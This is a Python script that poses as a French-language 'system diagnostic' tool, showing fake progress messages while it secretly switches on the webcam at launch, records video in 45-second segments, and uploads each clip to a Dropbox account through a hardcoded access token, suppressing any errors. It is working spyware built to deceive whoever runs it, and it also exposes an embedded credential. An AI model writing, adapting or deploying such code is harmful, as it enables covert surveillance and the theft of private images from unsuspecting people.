import sys
import subprocess
import importlib.util
import os
import threading
from pathlib import Path
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox

# ==================================================
# 1. INSTALLATION DES DEPENDANCES
# ==================================================

def install_package(package, module):
    if importlib.util.find_spec(module) is None:
        print(f"Installation de {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_package("opencv-python", "cv2")
install_package("Pillow", "PIL")
install_package("dropbox", "dropbox")

import cv2
import dropbox


# ==================================================
# 2. CONFIGURATION
# ==================================================

WINDOW_TITLE = "SYSTEM DIAGNOSTIC"
VIDEO_FOLDER = Path.home() / "Videos" / "SystemDiagnostic"
DROPBOX_FOLDER = "/Videos"
SEGMENT_SECONDS = 45

VIDEO_FOLDER.mkdir(parents=True, exist_ok=True)


# ==================================================
# 3. VARIABLES
# ==================================================

cap = None
writer = None
camera_running = False
recording = False
video_path = None
segment_start_time = None
frames_written = 0


# ==================================================
# 4. INTERFACE
# ==================================================

root = tk.Tk()
root.title(WINDOW_TITLE)
root.geometry("520x340")
root.configure(bg="#101820")
root.resizable(False, False)


def make_label(text, size=11, color="white"):
    return tk.Label(root, text=text, fg=color, bg="#101820", font=("Consolas", size))


title = make_label("SYSTEM DIAGNOSTIC", 22, "#00ff99")
title.pack(pady=25)

status = make_label("En attente...", 11)
status.pack(pady=12)

progress = ttk.Progressbar(root, length=420, maximum=100)
progress.pack(pady=15)


# ==================================================
# 5. DIAGNOSTIC
# ==================================================

messages = [
    "Analyse des composants...",
    "Vérification du système...",
    "Recherche des périphériques...",
    "Vérification des drivers...",
    "Diagnostic terminé."
]


def start_diagnostic():
    start_button.config(state="disabled")
    run_step(0)


def run_step(i):
    if i < len(messages):
        status.config(text=messages[i])
        progress["value"] = (i + 1) * 20
        root.after(700, lambda: run_step(i + 1))
    else:
        status.config(text="Diagnostic terminé.")


# ==================================================
# 6. CAMERA + ENREGISTREMENT
# ==================================================

def start_camera_and_recording():
    global cap, camera_running

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        cap.release()
        cap = None
        return

    camera_running = True
    start_new_segment()
    update_loop()


def start_new_segment():
    global writer, video_path, recording, segment_start_time, frames_written

    if writer is not None:
        writer.release()
        writer = None
        if video_path and video_path.exists() and frames_written > 5:
            threading.Thread(target=upload_file, args=(video_path,), daemon=True).start()

    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

    filename = datetime.now().strftime("video_%Y%m%d_%H%M%S.avi")
    video_path = VIDEO_FOLDER / filename

    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    writer = cv2.VideoWriter(str(video_path), fourcc, 20.0, (width, height))

    if not writer.isOpened():
        writer = None
        return

    recording = True
    segment_start_time = datetime.now()
    frames_written = 0


def update_loop():
    global frames_written

    if not camera_running or cap is None:
        return

    ret, frame = cap.read()
    if not ret:
        root.after(1000, update_loop)
        return

    if recording and writer is not None:
        writer.write(frame)
        frames_written += 1

        elapsed = (datetime.now() - segment_start_time).total_seconds()
        if elapsed >= SEGMENT_SECONDS:
            start_new_segment()

    root.after(30, update_loop)


def stop_everything():
    global recording, writer, camera_running, cap

    recording = False

    if writer is not None:
        writer.release()
        writer = None

    if cap is not None:
        cap.release()
        cap = None

    camera_running = False

    if video_path and video_path.exists() and frames_written > 5:
        upload_file(video_path)


# ==================================================
# 7. DROPBOX
# ==================================================

def upload_file(filepath):
    token = "sl.u.AG5p13_-2LRBFIEY0-dr-Y0YOMH5MOY0FZqZZ0vsi1qanb0dqj89YlLKfxkylQsGLIvq9_Zc0LpEfcFXLFLmU8t2y00UP_At-XVfuIoC_-au_L6iYGx5nAXlcXid124krj4YmFpIAVrlDzAA8BcPnoKpvjtwB2SXE97k9L_YaoHKgnnLPIehpLSR6iy9Uq90qf1MoJvzz6FwME1k5KeX-zGIJ2LVObMX1omiUxuRZ9SEDWcjG9dtcnLZpun0oVlM3g7XQXDEICZVHIea1tqcG0N1on-QWHkJ4NguIiQAkHxx1TJyYipV1MZ4CY7FWsKeBlVFAuiCyQX6s3DjHRh17fv9ebZrBYlNJHD53egQXEZNN5_WpsMteF6ZfcFFZ7RQYEF2lBb6igepZfXtTufRiE1KdO5k3IwNxhP-ldLTBWvdR9dPQ7H57Dy42aP2C9XYQmWhQ8Uvptm5GFUsoVHvm0nRIbc8rzylRX3Dz6TMV5uJEcWk-31zGA5k2_Vsf49XozemfvwAV2xXHkMDdaqbForVAFsNCGMZDt_ufAj8bIRBDC6jBin4_9jsseh9HZFTGKtlZ5qIrBq3FNBPs7WG4NtYfWIZepMYXephfZpRZfHAP_Iwans_P4_8XhBrXU04Qi3CQaq-aenr6vE14x9rQHxpvw6ui_C7yg_vdx35YdRgpyZa-LE9NC2VLIeFaJI_rOAhQ1gPIuMMXC2tAHx8xskr1nCOcCBkaODnddBQb2Gxcu0g6tYl9KIUG8UNPDNaOmnXgsVmMnOAUAxHXTdsHDJgWb6pmu4naubz9MOSGnfN1KsekTE6-IWXYUSHrJ1uQnWuD0joxBXEZgkb-NcHAy-m0jrol_CAb73WqxAio3s2WhCs7jNTldg4YMU1sIC9ahFJnv5Yy63M9d1h7m87NTbMUbqD3usxqjWBGz9JaFDhhzTirc7xP2j7osTrCJvfxiwtDEmABwvgOdrMxmZz06i4zpY_ZXDwb9WzN-oBJK2GiZ9pwNoCMHhZdnIw-UBXPMGv2rZmN932l-pQrWGkt-k9qdQURy-xgRwhxRxWWhA_PBwWQXRB32NINQYkG8idA0r5DEwUHK7-efb12rbMRAkLLkBCw6e7Hj4C4DdFxofAgmMkWnN190-5qnehBuZ31ZuVpDu7MIpg-tfAMIPtc_V6RgVmmr3Wn7AF2TCenXnqYXPflnlXpIZpNrHQ2yEQFb2eawavvhidslDYmgL7q4CGWRg34YxH2GB5AmK_QM08dMMSinLl7Z0jvDIMxTyOwQX0xUPy4xdtOTdfzUDkp-T-iQ60lGEA3qkOLyRAAe2jFZhTIBnCe_s7VGGxU0OIftQWgWOKCH_bW3NAG7VyV0tqjr2I6uzcTBJO3_jIHOT43cSV-mRARO1jxQjBnBaMoZH2UBO32UkU7tBE9qsju4qjACFgIqWlRJEwpiOiiHyyy-Sc7ZqMmS2fRS2gcjd8aY52APB4bJB5-Q54A58WbwE4"

    try:
        dbx = dropbox.Dropbox(token)
        with open(filepath, "rb") as f:
            dbx.files_upload(
                f.read(),
                f"{DROPBOX_FOLDER}/{filepath.name}",
                mode=dropbox.files.WriteMode.overwrite
            )
    except Exception:
        pass


# ==================================================
# 8. FERMETURE
# ==================================================

def close_program():
    stop_everything()
    root.destroy()


# ==================================================
# 9. BOUTON
# ==================================================

start_button = tk.Button(
    root,
    text="LANCER LE DIAGNOSTIC",
    command=start_diagnostic,
    bg="#263746",
    fg="white",
    font=("Consolas", 11),
    width=28
)
start_button.pack(pady=25)


# ==================================================
# 10. DÉMARRAGE
# ==================================================

root.protocol("WM_DELETE_WINDOW", close_program)
root.after(800, start_camera_and_recording)

root.mainloop()